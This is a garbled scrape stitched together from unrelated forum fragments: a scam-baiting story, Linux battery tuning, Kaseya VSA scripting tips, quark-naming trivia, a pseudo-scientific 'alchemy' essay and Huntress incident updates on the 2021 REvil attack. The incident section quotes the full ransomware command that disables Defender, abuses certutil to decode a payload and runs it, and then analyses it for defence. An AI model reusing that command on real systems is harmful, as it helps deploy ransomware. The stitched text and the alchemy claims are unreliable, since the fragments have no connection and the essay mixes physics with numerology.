So he told me to reach this guy called Kyle Patternson using Telegram!

I already knew this was bad, so I played alone. He send me a PDF file and asked to have it ready in 3 days. Exactly a 100 pages, so what I did was that I copied and paste a 100 pages of Spanish news and sent it to him at the third day.

He tells me they will review it and then they will contact me back to let me know if it was good and pay me.

The guy hits me back the next day telling that the job was superb and that I will get my payment.

So, he asked me for my PayPal account, I gave him one that I had with a fake name for other situations. The guy sent me an email supposedly from the company that he represents saying that the total amount to pay me was $5.508.

But the only condition was that “A Linking Fee of $408 was required from my end and it was refundable a copy of my identity card”. And of course a long explanation saying that the money was being held by Chase.

I told him that what he was saying was odd, that I will contact chase, so he said that this is something only for big companies and that 90% os the customer services has no idea of it, so if I call and ask they might not know! I was laughing so hard.

Then he sent me a “letter from chase” called “Statement of Guarantee”; saying not to be worried, that this was legit, man, my little brother can make a document that look more real than that thing.

So, I keep playing with him and I asked him where to deposit the money and he sent me to various websites, you know like Kwork and Skrill.com.

So I created a fake account and using the Firefox  Inspect Element feature you can take any website and make changes but only in your computer. So I made it look like if I made de deposit and sent him an screenshot.

Man, this guy was so happy, so he gave me an account ID to deposit it, and that I had only 30 minutes to do it.

Now I’m playing with his patience, I disconnected from telegram and connected back after 40 minutes, he was so mad and told me the account was no longer good, that he will get me another one.

Man, I had him like that for 3 days, the guy gave me like 15 different accounts (of course I reported them all) to make the deposit but I always had something to do, so I couldn’t make the deposit.

The last time I told him that Skrill didn’t let me do the deposit and that I will prefer a direct deposit via PayPal.

I can just imagine his face, now he is mad and telling me I’m not a serious freelancer and that I’m wasting his time. I reminded him that I want a direct deposit and again told me it was not possible, but he will get me his supervisor.

I usually just have a browser window open, maybe one or two terminals, an Electron app, and Spotify. Typical discharge rate at idle with everything open is between 6-9 W. If I close everything and have just a terminal open with powertop, I get around 4-5 W. Playing a youtube video can take it up to 10-12 W.

Did you enable the [AMD p-state scaling driver](https://www.reddit.com/r/linux/comments/15p4bfs/amd_pstate_and_amd_pstate_epp_scaling_driver/)? This seemed to improve battery life a bit for me.

We push/pull:

* Generic PowerShell script to run the necessary Arctic Wolf install commands and log the results. The script has macros that our app replaces with customer ID, variable data like license info, platform-specific arguments, and such. This results in a more streamlined PS script than passing (and validating) the required arguments.
* Client-specific MSI file
* Client-specific JSON file
* Sysinternals SysMon package\*
* Automation App that downloads the required files, validates the required parameters, and then executes the command/script to perform the desired actions.

The App dynamically edits the file paths to download the correct components and edits the PS script to select platform-specific (X86/64) options and define client references. The App *pulls* the required files rather than having VSA figure out what to push.

\---------------------  
There are just two real commands in the PS file - the EXE that installs SysMon and the MSIEXEC command to deploy Arctic Wolf. We also DO NOT put files into the KWorking folder - EVER as that is a potential security risk.

**Are you logging?** What do the logs tell you?

**Are you running as SYSTEM?**

**Are you running a PowerShell via ExecutePowerShell**? **DON'T!** Call PS explicitly so you know it loads correctly and you can capture the output.

Always use ExecuteShellCommandToVariable, invoke powershell.exe using a full path, and evaluate the STDOUT for errors (write the variable contents to the procedure log).

**Calling MSIEXEC from VSA** can sometimes be challenging - using a BAT file often improves the odds of success. You can push the BAT file and other files, then run the BAT file via Live Connect command prompt (not PS!!) and verify it works.

Тебе не придется искать заказы, платить за размещение своих товаров, а только иметь портфолио и только ждать, а ждать для первого заказа придется от одного месяца или двух, также смотря что ты продаешь.&lt;/p&gt;

* NEVER use the KWorking folder for deployments. You will wind up leaving trash behind, which becomes a security risk. It's also difficult to clean up as most installs create lots of extraction, temp, and log files, so removing the MSI/EXE that you deploy isn't enough. 
* Create a working subfolder in C:\\Temp. deploy files there, execute from there, and log results to there. Pull the log file via GetFile when done, then recursively delete the work subfolder. Always use a unique, short name without spaces in case multiple deployments are triggered. Leaving install packages and logs behind is considered a potential security vulnerability. Eliminating spaces eliminates the need to worry about when to quote paths and when not to.
* ALWAYS use executeShellCommandToVariable so you can collect, parse, and log the results of the command - otherwise you're operating in the dark. You can review the output for either success or failure messages and write script logs appropriately.
* STOP including ""X86"" and ""X64"" in file names on the endpoint. 
   * Place ""my\_installer\_x64"" and ""my\_installer\_x86"" in your ""deploy-from"" folder.
   * Detect the OS and download the appropriate file to ""my\_installer"" - without any platform ID. Then - simply run ""my\_installer"" as it will be the correct, platform-specific version. This simplifies the remaining script logic and eliminates lots of code duplication, reducing complexity and enhancing reliability.
* You make an assumption in your WriteProcedureLogEntry that it worked, but you aren't checking anything to confirm this. There are two ways - brute-force or elegant - to handle this.
   * BRUTE FORCE - What you're doing now - HALT ON FAIL in the command  
Downside to this is that you don't know WHY it failed. I NEVER use HALT ON FAIL for commands, but do use it to force an intentional script failure. Also, this only works when the script fails and may not accurately report when the ACTION fails.
   * ELEGANT - 
      * Use - executeShellCommandToVariable to collect the output combined with CONTINUE ON FAIL. 
      * Examine the #GLOBAL:CmdResults# variable for either NOT CONTAINS ""Success Message"" or CONTAINS ""Fail Message"" (the former is usually easier as there can be many possible failure messages). When this is TRUE, you write a failure message to the procedure log, then - with HALT ON FAIL set, perform an illegal action, such as loading a variable from an invalid file (Q:\\Nowhere\\badfile.123). This forces the procedure to fail AFTER you write the status and the collected results to the log. You can then add a message following this logic to report your success.  
This has the benefit of confirming that the ACTION was successful, not simply whether the command ran but didn't successfully perform the desired action
* Avoid long, nested IF statements to check progress. This logic becomes difficult to follow and troubleshoot. This isn't in your script, but I've seen many public examples of this, and it's just poor design. Instead, perform a check and if the check fails, write a log message why and force the script failure as noted above. Each check is it's own If/Then clause - same result, less clutter and confusion, with better logging.
* Avoid executeFile and similar as you lose insight into the process. Also note that executeShellCommandToVariable uses a unique file name to collect output for each command, while executePowerShellToVariable does not. A hung PS1 script can either prevent other PS scripts from running and WILL result in incorrect results being returned. We NEVER use the executepSP commands in VSA, preferring to use executeShellCommand to specify the powershell command, arguments, script, and script arguments.

Some of these comments apply generically to any RMM scripting and not just to your specific situation, but having published well over 300 VSA scripts for our MSP Customers, I can say that these methods work.

As a game developer, living in a country with an almost non-existant games industry such as Venezuela, my local options where extremely few, so I had given up on them from the get-go.

I looked abroad, but employers didn't seem to want to hire a junior foreigner like me. So an industry acquaintance I made over the internet suggested I should try doing freelance work to get myself some paid experience.

I checked out several freelancing pages (Fiverr, Freelancer, Kwork, among many others that aren't worth mentioning) looking for one that offered me the best chances.

I saw that they largely split into two models: either the sellers published the services and the buyers approached; or the buyers published projects and the sellers approached.

Turns out I saw a golden opportunity on the later model. 

I don't know if this is the case for all fields on the platform, but in mine I was seeing lots of bots bidding on the projects. Always the same faces, sending the same cookiecutter proposals.

It always went along the lines of ""Hi there! I read your requirements and understood them completely. I have +X years of experience, blah blah blah"".

So just by being human, and delivering custom proposals, I automatically stood out from the rest.

I also abused certain tricks I learned over the years from several books in psychology in order to build rapport faster with potential clients. But I won't be sharing those as readily on the internet in order to keep my competitive advantage ;)

   - Join Playtest clowd or platforms like this to test games for money (your region is not the worst for it, I guess).

* Create a Portfolio to apply for better jobs
   1) you can make and publish your own project
   2) or you can join an indie project, where games are made on enthusiasm. Usually you can find such teams among students of game dev specialities
   3) join game jam teams to create game prototypes in small team as fast as possible ((=

* Try Freelance
   1) If you have already some skills and may be some portfolio - you can try performing tasks for money on some platforms like kwork and others
   2) or you even can try publishing your assets on Unity Store

* Networking is a good way also. You never know if your friend's friend has a buddy at some gamedev company, that can be interested in you as a candidate. Ask, acquire new connection in the industry by visiting conferences, webinars, job fairs and all this stuff.

Law names do get stupid though, and when reading a title the conclusion you should generally draw is that whatever the acronym is made to sound like, the bill probably does the opposite.


On the physics side, it's especially prevalent in particle physics. It also often uses ""clever"" names for things. It's rather amusing. One of the main studied candidates for dark matter are WIMPs (weakly interacting massive particles) and they are in contrast to MACHOs (massive astrophysical compact halo objects).

As it was found protons and neutrons had substructure, we named the positive charged bits ""up"" and negative bits ""down"". Then we found a new quark with the same charge as the up. That wasn't really expected and it sort of messed up the model at the time. It was strange, so we called it the strange quark and the property of having strange quarks the ""strangeness"" of a particle. The work quark itself comes from Joyce's Finnegans Wake, with Gell-Mann describing the naming process as so:

""In 1963, when I assigned the name ""quark"" to the fundamental constituents of the nucleon, I had the sound first, without the spelling, which could have been ""kwork"". Then, in one of my occasional perusals of Finnegans Wake, by James Joyce, I came across the word ""quark"" in the phrase ""Three quarks for Muster Mark"". Since ""quark"" (meaning, for one thing, the cry of the gull) was clearly intended to rhyme with ""Mark"", as well as ""bark"" and other such words, I had to find an excuse to pronounce it as ""kwork"". But the book represents the dream of a publican named Humphrey Chimpden Earwicker. Words in the text are typically drawn from several sources at once, like the ""portmanteau"" words in Through the Looking-Glass. From time to time, phrases occur in the book that are partially determined by calls for drinks at the bar. I argued, therefore, that perhaps one of the multiple sources of the cry ""Three quarks for Muster Mark"" might be ""Three quarts for Mister Mark"", in which case the pronunciation ""kwork"" would not be totally unjustified. In any case, the number three fitted perfectly the way quarks occur in nature.""

We created a new model called the Eightfold way, named after the Eightfold path of Buddhism, to try and account for strange quarks.  The model developed further, and the favored mathematical model predicted a 4th quark with the charge of a down quark. It was named the charm or charmed quark, because it'd be really nice if it existed and make the math ""beautiful"". Eventually, we found two others that we had reasonable certainty were the last, and as they were the heaviest and final they were named top and down as they were the uppest of up quarks and downest of down quarks.

There's another purely theoretical theory called supersymmetry that if exists requires a supersymmetric superpartner of all fermions. The current convention is to add s to in front of all words in something's partner's name. You have 6 squarks, the sup squark, sdown squark, sstrange squark, scharm squark, stop squark and sbottom squark.

Eventually for unstable particles that just kept adding up, people got lazy and we just started using latin and greek letters to name them. Now names are pretty inconsistent, and sometimes for no apparent reason like the 3 generations of the electron family being named electron, muon and tau. Technically it's called tauon, but it's usually referred to as just tau.

I am going to break you into how this functions slowly then make it more complex so that you can recognize whats happening (you may already be familiar with it). To demonstrate how alchemy works in practice we will start out with simple symbols that act as ""keys"" then branch into comparative examples, we will call this alchemical solution ""tuning"".

First examples-

As you probably guessed these things can have symbolic representations such as triangles, octagons or other geometric shapes.  A good example is the ""holy trinity"" of the christian faith which can be represented by a triangle. For those of you familiar with conspiracies and Freemasons you will recognize 3 being a sacred number to them that comes up a lot...this is why. I don't want to get into numerology in this (though like the other subjects there is a shred of truth in it) but to summarize it 10 is what they consider gods number so the infamous 33 degree of masonry is 3, 10s.

 but for now lets go with some of our own ""holy trinities"".
 

    Soul, body, mind

    The body is the material, the soul electrical and the mind electro/chemical. 

what does your body need to take in to stay alive?

    water, food, air

soul (the electricity inside you that animates you) needs water so that the electro/chemical reactions of your nervous system can function and electricity can conduct better inside of you, body needs food so it may build itself strong, mind (your brain) needs air to function etc.

you must maintain a proper balance of all three to stay healthy...in all instances of this trinity. Ill keep going.

    Plants, animals, fungus, 

the 3 different forms of life. Fungus being an in between for plants and animals as fungus grows like a plant but can move and even solve mazes. 


    young, old, adult

    red, yellow, blue, the primary colors

    forward, reverse, neutral

    hot, cold, moderate

    birth, death, life

    gay, straight, bi

    action, reaction, inaction (or arrest)

    over, under, surface

    black, white, gray

    Volts, current, resistance

We will elaborate on this one, this is what is know as Ohm's Law, a mathematical formula used by electrical engineers and electricians alike for electrical work.


    positive, negative, neutral

    good, bad, neutral

    left, right, center

    novice, master, adept 

    micro, macro, regular?

    proton, neutron, electron

Protons and neutrons are made up of what scientists call ""quarks"".
 
""A quark (/kwɔːrk/ KWORK or /kwɑːrk/ KWARK) is a type of elementary particle and a fundamental constituent of matter. Quarks combine to form composite particles called hadrons, the most stable of which are protons and neutrons, the components of atomic nuclei.[1] All commonly observable matter is composed of up quarks, down quarks and electrons.
 
A proton is composed of two up quarks, one down quark, and the gluons that mediate the forces ""binding"" them together. The color assignment of individual quarks is arbitrary, but all three colors must be present; red, blue and green are used as an analogy to the primary colors that together produce a white color.""
 
We can go even further still. Particle families or generations also come in threes. 
 
 
""In particle physics, a generation or family is a division of the elementary particles. Between generations, particles differ by their flavour quantum number and mass, but their electric and strong interactions are identical.

There are three generations according to the Standard Model of particle physics. Each generation contains two types of leptons and two types of quarks. The two leptons may be classified into one with electric charge −1 (electron-like) and neutral (neutrino); the two quarks may be classified into one with charge −1⁄3 (down-type) and one with charge +2⁄3 (up-type). The basic features of quark-lepton generation or families, such as their masses and mixings etc., can be described by some of the proposed family symmetries.""
 
 
 
Lets take a step back from science and try one last one but this time we will elaborate a little more on it.

    wisdom, power, courage


with just wisdom and power you know what to do and you have the power to do it but you don't have the courage to actually act and accomplish it.

with just wisdom and courage you know what to do and you have the will to do it but you don't have the power to accomplish it.

with just power and courage you have the ability and will to do it but you don't know what to do.

One escalated to a Sev-1 with Kaseya when the VSA got locked in a post patch-update reboot/scan loop, rebooting every few minutes. They had nearly a quarter-million procedures queued (with 3200 agents!) and had to clear them through a SQL query - a process that took over 50 hours to complete. Also had to clear the message queue before bringing VSA fully back online. They wound up expanding the SQL storage volumes, running a compress operation, and are considering some additional RAM and optimizations that we recommended as part of this remediation. They found that the DB had suddenly grown from around 12G to over 45G.

A second client called today that had back-end changes that occurred 5/1. Default agent directory changed and there's no option to set it (they use a custom working dir). Agents installed since the upgrade are using the other (KWorking) working folder, haven't fully deployed files into the directory, and agents refuse to have any policies apply. We again found many procedures that were stuck since 5/1 that should have been running tasks daily. Waiting for some additional info from the client before we open a ticket for them with Kaseya. They had a ticket with us 2 days ago related to failed reporting on VSA, spinning and no output generated. We're now thinking it's related to the more serious issue.

I also checked our two dev servers and neither one has the option to set the default working directory now (updated to latest release last weekend) - that was an essential process when on-prem clients wanted to use a custom working directory. On-prem now looks like SAAS without the ""set system default"" option for the working directory.

However, there is enough evidence on the contrary to backup at least some claims from other vendors who were able to stop this attack from completely hosing a system. If your definition of a successful mitigation was not letting agent.exe run in the first place, then no, there wasn't a single AV solution out there this side of ThreatLocker that would have stopped that execution. Most had c:\\kworking whitelisted and agent.exe was a valid signed executable. The fun started when an old version of Defender was plopped into the system directory and started side loading a malicious DLL to deploy Sodinokibi. It's at this point - if your EDR AV policies were setup right - that SentinelOne, Sophos, Bitdefender, Carbon Black, Cylance and I'm sure others, detected the malicious behavior of a ransomware attack and stopped it. Sophos in particular, posted a video of a VM from several months ago; using months old AV definitions, to prove that their heuristics prevented encryption.

number of on-premise customers only as of 2:00 PM EDT today. We are in the process of investigating the root cause of the incident with an abundance of caution but we recommend that you IMMEDIATELY shutdown your VSA server until you receive further notice from us. Its critical that you do this immediately, because one of the first things the attacker does is shutoff administrative access to the VSA.

&gt;# Update 3 - 07/02/2021 - 1517 ET

&gt;Based on the forensic patterns, [ransomware notes](https://gist.github.com/KyleHanslovan/9541cc0f2189d0ebd86bf8fdba525fd0) and the TOR URL, we strongly believe a REvil/Sodinokibi RaaS affiliate is behind these intrusions.

&gt;The Huntress customer support team has started pre-emptively calling all of our VSA partners to make the aware of the situation. We currently have three Huntress partners who are impacted with roughly 200 businesses that have been encrypted. We are aware of at least 8 impacted MSP partners at this time.

&gt;# Update 4 - 07/02/2021 - 1622 ET

&gt;We are seeing indications VSA admin user accounts were disabled only moments before ransomware is deployed. The source of these indicators are auto-emailed Kaseya VSA Security Notifications indicated the ""`KElevated######`"" (SQL User) account performed this action. We're hesitant to jump to any conclusions, but this could via suggest execution via SQL commands.

&gt;# Update 5 - 07/02/2021 - 2110 ET

Our July 13 Tradecraft Tuesday episode that dove into more technical details of this incident was recorded (thanks everyone who emailed). For those searching for the video, we'd [posted it to our website](https://www.huntress.com/resources/tradecraft-tuesday/mass-msp-ransomweare-incident) (YouTube keeps banning us for hacking content ;).

We've also received a large number of requests from partners and media asking for a statement on our response timeline and ""whether Huntress was the first to detect the incident?"". Frankly speaking, it's likely compromised MSPs were the first to call Kaseya. It took us about an hour to confirm VSA was being mass compromised (we initially tracked these as individual MSP incidents). As for an official timeline, [our CEO previously posted](https://www.reddit.com/r/msp/comments/odnw9b/kaseya_seems_to_have_done_a_great_job_at_limiting/h461fcg) the following:

&gt;REvil payloads were timed to go off at 1630 UTC (1230 ET) and Huntress started gathering sporadic intel from multiple sources (our data, phone calls, support tickets) \~10min after ransomware started deploying en masse. Roughly an hour after the first shots were fired, I personally [emailed Kaseya Executives](https://i.imgur.com/H9RCklq.png) (1345 ET) and [reached out to the Kaseya Security team on Discord](https://i.imgur.com/9M0qyhX.png) (1348 ET). I [received a phone call](https://i.imgur.com/KuIpScg.png) (1353 ET) from Kaseya within 10 minutes of my first outreach and [we were on a Zoom with their team](https://i.imgur.com/6Jxk1IS.png) (1402 ET) dumping details and planning response actions 92 minutes from the first detonation.

Thank again for all the community support!

# Update 19 - 07/13/2021 - 0953 ET

In Update 5 of our Reddit post (7/2/2021 2110 ET) thread, we mentioned, “For our Huntress partners using VSA, we took proactive steps to help protect your systems. We will send out a follow-up with details.”

We decided to be intentionally vague until Kaseya released the required patch. Now, we can share those “proactive steps” we took and explain why we took them.

**What We Saw**

About two hours after the incidents started, we were alerted to the payload that was used, obfuscated as “Kaseya VSA Agent Hot-fix”:

`C:\WINDOWS\system32\cmd.exe"" /c ping 127.0.0.1 -n 4979 &gt; nul &amp; C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe Set-MpPreference -DisableRealtimeMonitoring $true -DisableIntrusionPreventionSystem $true -DisableIOAVProtection $true -DisableScriptScanning $true -EnableControlledFolderAccess Disabled -EnableNetworkProtection AuditMode -Force -MAPSReporting Disabled -SubmitSamplesConsent NeverSend &amp; copy /Y C:\Windows\System32\certutil.exe C:\Windows\cert.exe &amp; echo %RANDOM% &gt;&gt; C:\Windows\cert.exe &amp; C:\Windows\cert.exe -decode c:\kworking\agent.crt c:\kworking\agent.exe &amp; del /q /f c:\kworking\agent.crt C:\Windows\cert.exe &amp; c:\kworking\agent.exe`

Our ThreatOps and Engineering teams reviewed the payload and were able to pull out some bits of information that would eventually lead to a way to “vaccinate” Huntress partners from getting encrypted. We looked at the following:

1. `copy /Y C:\Windows\System32\certutil.exe C:\Windows\cert.exe`

Make a copy of the legitimate Windows `certutil.exe` utility and place it in the `C:\Windows\` folder with a new name: `cert.exe`.

2. `echo %RANDOM% &gt;&gt; C:\Windows\cert.exe`

Append a ""random"" value to the end of `cert.exe`. This is accomplished with a built-in feature of DOS where the %RANDOM% environment variable will produce a random value when called. Appending this to the end of a legit executable doesn't prevent that executable from running, but it changes the hash which may be used in automated detection platforms to detect its use.

3. `C:\Windows\cert.exe -decode c:\kworking\agent.crt c:\kworking\agent.exe`

Using the modified but legitimate Windows `certutil`, the attackers decoded the malicious payload, `agent.exe` from the `agent.crt` file that was sent down to endpoints via the VSA server.

4. `del /q /f c:\kworking\agent.crt C:\Windows\cert.exe`

Delete the `agent.crt` and `cert.exe` files.

5. `c:\kworking\agent.exe`

Execute the ransomware payload, `agent.exe`.

In these examples, `c:\kworking` was displayed and the default directory, but this is actually a configurable variable known as #vAgentConfiguration.AgentTempDir# in a given VSA deployment. If this is changed, the attack would've been carried out in the configured directory.

**What Is** `certutil.exe`

According to Microsoft, “`Certutil.exe` is a command-line program, installed as part of Certificate Services. You can use certutil.exe to dump and display certification authority (CA) configuration information, configure Certificate Services, backup and restore CA components, and verify certificates, key pairs, and certificate chains.”

Essentially, if you give `certutil.exe` a certificate to decode, it does just that. In this case, `cert.exe` would base64 decode `agent.crt` to `agent.exe`. REvil understood this and used it maliciously. However, if there’s a file that has the same name as the decoded name, then `certutil` won’t decode it because it’s “in the way.”

Therefore, to “vaccinate” VSA servers from running a malicious program, all that was needed was to add an innocent file of the same name as `agent.exe` ([video demonstration](https://huntresslabs.wistia.com/medias/kjb7az91mu)).

**What We Did**

The Huntress platform allows us to pull files in case we need to run some extra investigation on suspicious activity, something we did a lot during this attack, but it also allows us to push files down to endpoints with the Huntress service. With that knowledge, our engineers got to work creating a fake `agent.exe` to send to the `C:\kworking\` dir.However, there were a few problems with this vaccine:

1. If REvil caught wind of the vaccine, they could just change the name of the file or directory, and it would run as intended.
2. The `kworking` dir is configurable, so if it is named something different, the vaccine wouldn’t work.
3. The Huntress agent.exe could be confused with the REvil `agent.exe`.

Taking all of these into account, we decided it would be best to just push it out.

The decision to push out the vaccine as soon as we had it wasn’t something we took lightly. However, we saw what felt like an opportunity to help in the time of a crisis, and we knew the vaccine wouldn’t cause any damage. Because of this, we acted fast and pushed it out to our partners.

The vaccine was initially pushed out before 1830 ET that evening to all Huntress agents as long as they were checking in. The Huntress `agent.exe` is a [text file](https://huntress.io/note.txt) that includes instructions for how to contact us.

We let Kaseya and other vendors know what the Huntress `agent.exe` file hashes were so they didn’t block it and wouldn’t have any false positives for any detectors:

**MD5**: 10ec4c5b19b88a5e1b7bf1e3a9b43c12

**SHA1**: a4636c16b43affa1957a9f1edbd725a0d9c42e3a

**SHA256**: 5dca077e18f20fc7c8c08b9fd0be6154b4c16a7dcf45bdf69767fa1ce32f4f5d

Some partners have since brought up that they thought they were hacked because they saw the `agent.exe` file but then realized that it was the Huntress version. We never want to give our customers an unnecessary reason to panic, but in this emergency situation, we were okay with people being a bit shocked with what turned out to be an innocent file rather than being fully encrypted. Even so, we felt it wise to make another version of the `agent.exe` [text file](https://huntress.io/readme.txt).

Hopefully, this update helps contribute to the efforts of cybersecurity researchers so we can all be more prepared for the next event.

We're moving all of our commentary on this situation to r/MSP. [https://www.reddit.com/r/msp/comments/ocggbv/crticial\_ransomware\_incident\_in\_progress/](https://www.reddit.com/r/msp/comments/ocggbv/crticial_ransomware_incident_in_progress/)

# Update 1 - 07/02/2021 - 1417 ET

We are tracking four MSPs where this has happened and working in close collaboration with two of them. Although all four are running Kaseya VSA, we have not validated that VSA is being exploited (not fair at this time to say ""Kaseya has been hacked"" without evidence). Here's validated indicators of compromise:

* Ransomware encryptor is dropped to `c:\kworking\agent.exe`
* The VSA procedure is named ""Kaseya VSA Agent Hot-fix”
* At least two tasks run the following:

`""C:\WINDOWS\system32\cmd.exe"" /c ping 127.0.0.1 -n 4979 &gt; nul &amp; C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe Set-MpPreference -DisableRealtimeMonitoring $true -DisableIntrusionPreventionSystem $true -DisableIOAVProtection $true -DisableScriptScanning $true -EnableControlledFolderAccess Disabled -EnableNetworkProtection AuditMode -Force -MAPSReporting Disabled -SubmitSamplesConsent NeverSend &amp; copy /Y C:\Windows\System32\certutil.exe C:\Windows\cert.exe &amp; echo %RANDOM% &gt;&gt; C:\Windows\cert.exe &amp; C:\Windows\cert.exe -decode c:\kworking\agent.crt c:\kworking\agent.exe &amp; del /q /f c:\kworking\agent.crt C:\Windows\cert.exe &amp; c:\kworking\agent.exe`",,,,,False,False,[],False,,{},,,False,False,True,t3_ocf0x1,,,False,/r/kaseya/comments/ocf0x1/kaseya_has_been_hacked_with_randomware_that/h3u2mee/,public,False,t1_h3u2mee,,,[],1625250462.0,r/kaseya,0,,,,,,,,,,,kwork,1479757223.0,1652749649.0,,,

What I have done so far:

1. Installed and configured TLP

TLP_ENABLE=""1""
START_CHARGE_THRESH_BAT0=""50""
STOP_CHARGE_THRESH_BAT0=""80""
RESTORE_THRESHOLDS_ON_BAT=""1""
TPSMAPI_ENABLE=""0""
```

2- Installed 'Intel P-state and CPUFreq Manager' widget and have it running with default settings on 'Balance Power'

3- Configured prime offloading (as per ![PRIME Render Offload](http://download.nvidia.com/XFree86/Linux-x86_64/435.17/README/primerenderoffload.html)) and confirmed that it works when using 'Optimus Manager Qt' or either `__NV_PRIME_RENDER_OFFLOAD=1 __GLX_VENDOR_LIBRARY_NAME=nvidia` or `prime-run` when in hybrid mode

4- Configured some of the ![PCI-Express Runtime D3 (RTD3) Power Management](http://download.nvidia.com/XFree86/Linux-x86_64/435.17/README/dynamicpowermanagement.html) (my understanding is that these settings are only applied in hybrid or Nvidia modes)

It was a custom built thirteen bedroom home built back in the 60s for a couple with ten children. They used some of the bedrooms to run a business out of. Backs up to the homes of the parents of each son in law. Both sets of those parents provided the $112,000 down payment to balance out what they had spent educating older siblings of the son in laws. 

Most of the homes in the neighborhood are modest 1,500 to 2,000 sq ft, three or four bedroom homes, selling for $200,000 with property tax being around $3,000 per year. Taxes on this home are just above $8,000 per year which falls well below the SALT cap on federal deductibility. Utilities are another $10,000 a year.

7,500 sq ft is highly overrated, unless you have 16 people living in it, and 4 college students living in old two travel trailers with hookups behind the garage. My parents, hubby's parents, and hubby and I live here at the request if the son in laws and daughters. 

It works because we adults have seperate areas to retreat into and all adults stay out of the private business of the other adults. And as Paul Simon sang, we're ""still crazy after all these years!""

Two years ago, yougest son in law was up in NYC and then out in LA on job assignments. He stayed in the penthouse of a client that overlooks Central Park in NYC, and the home of a client that overlooks the Pacific out in LA. At both firm offices he got felt out for the possibility of moving there. 

He was thinking ""My brief years of being a tax attorney have not been for naught. I work 45 hours per week for more net pay than I would have left after kworking 70 hous here with 45%  combined payroll, federal income tax and AMT, state and local income tax, and a home mortgage five plus times larger than we have. I also like the polish dogs and chicken bake at Costco food court more than steak and lobster. And I can hear what my dad said when I wanted to take the team up to a Siberian (Michigan) law school, 'Son, there are three mothers that will not be happy!  And if Mama's not happy, nobody's happy, especially me, son! Besides, it's really cold up there in Siberia (Michigan).'"" LOL He did not share that thought.

That's usually how work ads work,

I need this to automatically and pull the output to a text file on the computer that the agent procedure would run on. After the txt file is filled out I would execute my PowerShell script that would begin checking the names to see if it's been taken or not. 

At this time, I wrote up some PowerShell to take the current output that SQLRead query does and I split the names by "", "" and then I take everything after the first period to get just the name.

&gt; this just gets wierder and wierder.

This has been my experience with Kaseya procedures lol.. once they work they can be super useful, but getting them to that point can be a major pain! 

One thing that might help is to run as many commands in **executeShellCommand()** steps as possible, and redirect their output and error streams to a text file, so you can see if they are returning errors. `net use Z: \\svr\share &gt;&gt;#dir#\NetUseCmd.txt 2&gt;&gt;&gt;&gt;&amp;1`

Normally in a command prompt you'd just do `net use Z: \\svr\share &gt;c:\kworking\NetUseCmd.txt 2&gt;&gt;&amp;1`, but in Kaseya [the `&gt;` character is reserved](http://help.kaseya.com/WebHelp/EN/VSA/9050000/#2855.htm), so you have to type it twice to escape it (so `&gt;&gt;` becomes `&gt;&gt;&gt;&gt;`). 

Then you can use the **getFile()** step to upload NetUseCmd.txt into the documents, or what I like to do is use the **getVariable()** step (with the 1st dropdown set to File Content), then use the **sendEmail()** step to email myself the output of the file (that way if a procedure takes a while to run then I don't have to keep checking to see when it's done).",[],,,,False,False,[],False,,{},,,False,False,True,t3_d0olkh,,,,/r/msp/comments/d0olkh/what_ths_is_up_with_kaseya_vsas_script_engine_and/ezplt4l/,public,False,,,,,1568043106.0,r/msp,0,,,,,,,,,,,kwork,1533917467.0,1576536895.0,False,[],

We have a ton of automation around VSA, and we put most complex logic into external applications and use Kaseya to Deploy, Execute, and Collect. These are things it does exceptionally well.

We have a tool that we sell called the [Multi-Tool](https://www.mspbuilder.com/products-multitool). It was designed for Service Desk and recently updated for use in Agent Procedures. It provides 60+ functions for Math, String Manipulation, Logic, Comparison, and Time Calculations. It even lets you treat a delimited string like an array, returning a specific element (field).

Things like who you run as (System/User) and environment (32/64b) will make a big difference when you are in the execute phase, but if you're externalizing your logic (as it seems) and using the deploy/execute/retrieve methods, there's not much you can't do.

I strongly recommend avoiding as many of the builtin ""steps"" on the left as possible, and using **executeShellCommand()** wherever you can. 

Example: There's a **deleteFile()** command -- I never use it. Instead, I use **executeShellCommand()** (as System) and run the command `del /F /Q (full_path_to_file)`. 

The main reason I recommend avoiding the built-in steps is that they are ""black box"" functionality you have little to no control over. When they fail, you have no idea why. Want to run **deleteFile()** as the agent credential account? You can't -- there's no option for it (so it will only run as SYSTEM). Want to delete a file using wildcards? You can't. But you can do both of those things with **executeShellCommand()** and the `del` command.

For running PowerShell scripts, here's the basic outline I use:

1. Add a **getVariable()** step (under the System section) and set the dropdown in the top-right to ""Agent Working Directory Path"" and set the name to **dir**. Now in your procedure you can refer to **#dir#** and it will correspond to your working directory (rather than hard-coding it in the procedure -- if you did that then if you ever changed it you'd need to change it in every procedure -- plus you only have to type **#dir#** instead of **C:\MyCompany\kworking** -- also some computers don't have the Windows installation on C:\ !).

2. Add an **executeShellCommand()** step and delete the PowerShell script, and the output text file that the PowerShell script is going to create, from the computer. `del /F /Q #dir#\Get-Info.ps1` and `del /F /Q #dir#\Get-Info.txt`.

3. Use the **writeFile()** step under the File section to write the PowerShell script to **#dir#\PowerShellScriptName.ps1**. When you're in Kaseya Agent Procedures &gt;&gt; Manage Procedures &gt;&gt; Schedule / Create, there is a **Manage Files** button at the top. You can use this to upload files to your VSA server. Then in procedures the **writeFile()** step will download them from the server to the computer. You could also upload them to an FTP/HTTP server, but I've encountered security-conscious clients that lock down external HTTP access, which could block those downloads.

4. Use the **executeShellCommand()** step to run your PowerShell script, which exports any data you want to text files. Run the command `powershell.exe -ExecutionPolicy Bypass -File #dir#\PowerShellScriptName.ps1` (with any parameters passed to the script after that, if needed). I'll add a parameter called `-outFile` to my scripts, so I can pass `-outFile #dir#\TextFileName.txt` to the script. That way the PS script also doesn't have the agent working directory hardcoded in it.

5. Use the **testFile()** step under the ""IFs"" section to test if the output file was created by the PowerShell script (this is why deleting the output file in step #2 above is important). If not, then there's either an issue with PowerShell, Windows, the Kaseya agent, or file permissions. You can add the **else** step below the **testFile()**, and one way to force the procedure to show a ""Failed"" status in the logs and in the LastExecStatus column is to add the **executeFile()** step under the File section, and make it run some bogus EXE that won't exist (like **C:\PowerShellScriptDidNotCreateExpectedFile.exe**). (Note that you can click a line then press Tab to indent it to the right, and Shift+Tab to outdent it back to the left. Any line under an If step needs to be indented once to the right, then the Else should be at the same level as the If, and anything under the Else should be indented to the right).

